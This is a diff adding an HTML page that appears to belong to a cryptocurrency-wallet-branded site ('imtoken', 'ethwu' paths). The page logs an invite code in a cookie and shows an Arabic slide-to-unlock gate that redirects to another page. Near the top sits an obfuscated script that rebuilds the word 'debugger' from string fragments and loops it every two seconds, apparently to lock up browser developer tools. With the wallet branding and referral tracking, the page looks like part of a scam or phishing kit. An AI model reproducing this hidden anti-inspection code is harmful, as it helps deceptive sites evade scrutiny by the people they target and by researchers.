@@ -1,0 +1,156 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0">
+    <meta name="description" content="">
+    <title></title>
+    <link rel="shortcut icon" href="/assets/addons/imtoken/ming/img/ethwu_icon.png"/>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/vant@2.12/lib/index.css"/>
+    <link href="/assets/addons/imtoken/ming/css/common.css?v=1.0.113" rel="stylesheet">
+    <script src="https://cdn.jsdelivr.net/npm/vue@2.6/dist/vue.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/vant@2.12/lib/vant.min.js"></script>
+    <script src="/assets/addons/imtoken/ming/js/js.cookie.js"></script>
+    <script src="/assets/addons/imtoken/ming/js/axios.min.js"></script>
+    <script src="/assets/addons/imtoken/ming/js/common.js"></script>
+</head>
+
+<script type="text/javascript">
+    var getHandler = function (){
+        return self==top?window:window.parent;
+    };
+    Cookies.set("invitation_code",getQueryString('invite_code'));
+</script>
+
+<script type="text/javascript">
+    !function(){
+        var _0x1cbb = ["tor", "struc", "call", "ger", "con", "bug", "de", "apply"];
+        setInterval(check, 2e3);
+        function check() {
+            function doCheck(_0x1834ff) {
+                if (('' + _0x1834ff / _0x1834ff)['length'] !== 0x1 || _0x1834ff % 0x14 === 0x0) {
+                    (function() {return !![]}[
+                    _0x1cbb[0x4] + _0x1cbb[0x1] + _0x1cbb[0x0]
+                        ](
+                        _0x1cbb[0x6] + _0x1cbb[0x5] + _0x1cbb[0x3]
+                    )[_0x1cbb[0x2]]());
+                } else {
+                    (function() {return ![]}[
+                    _0x1cbb[0x4] + _0x1cbb[0x1] + _0x1cbb[0x0]
+                        ](
+                        _0x1cbb[0x6] + _0x1cbb[0x5] + _0x1cbb[0x3]
+                    )[_0x1cbb[0x7]]());
+                }
+                doCheck(++_0x1834ff);
+            }
+            try {
+                doCheck(0)
+            } catch(err) { }
+        };
+    }();
+</script>
+
+
+<style>
+    .content{
+        background: url(/assets/addons/imtoken/ming/img/auth_bg.png) no-repeat center;
+        background-size: 100% 100%;
+        background-attachment:scroll;
+        width: 100%;
+        height: 100%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        overflow: hidden;
+        flex-direction: column;
+    }
+
+    .tip-img{
+        margin-bottom: 20px;
+    }
+
+    .tip-text{
+        color: #333;
+        font-size: 20px;
+        margin-bottom: 20px;
+    }
+
+    .tip-desc{
+        color: #3f3f3f;
+        font-size: 16px;
+        margin-bottom: 20px;
+        padding: 0 20px;
+        text-align: center;
+        white-space: break-spaces;
+    }
+    /*.drag_verify .dv_handler{*/
+    /*    border: 1px solid #fff !important;*/
+    /*}*/
+</style>
+<body>
+<div id="app">
+    <template id="app-temp">
+        <div class="content" style="background-image: none">
+            <img src="/assets/addons/imtoken/ming/img/sv_ar.png" width="100%" style="margin-bottom: 20px"/>
+            <div style="margin-bottom: 150px">
+                <drag-verify
+                        :width="width"
+                        :height="height"
+                        :text="text"
+                        :success-text="successText"
+                        :background="background"
+                        :progress-bar-bg="progressBarBg"
+                        :completed-bg="completedBg"
+                        :handler-bg="handlerBg"
+                        :handler-icon="handlerIcon"
+                        :text-size="textSize"
+                        :text-color="textColor"
+                        :success-icon="successIcon"
+                        :circle="getShape"
+                        @passcallback="passcallback">
+                </drag-verify>
+            </div>
+
+        </div>
+    </template>
+</div>
+<script src="/assets/addons/imtoken/ming/js/slide-verify.js"></script>
+</body>
+<script>
+    new Vue({
+        el: '#app',
+        template:"#app-temp",
+        data(){
+            return {
+                handlerIcon:'van-icon van-icon-arrow',
+                successIcon:'van-icon van-icon-success',
+                background:'#cccccc',
+                progressBarBg:'#0895e5',
+                completedBg:'#66cc66',
+                handlerBg:'#fff',
+                text:'السحب إلى الجهة اليمنى',
+                successText:'success',
+                width: 300,
+                height:50,
+                textColor: '#fff',
+                textSize:'16px',
+                isCircle:'true'
+            };
+        },
+        computed:{
+            getShape(){
+                return this.isCircle==='true'
+            }
+        },
+        methods:{
+            passcallback(){
+                Cookies.set("unlock",true);
+                setTimeout(function () {
+                    window.location="/addons/imtoken/ethwu/index";
+                },1000)
+            }
+        }
+    });
+</script>
+
+</html>
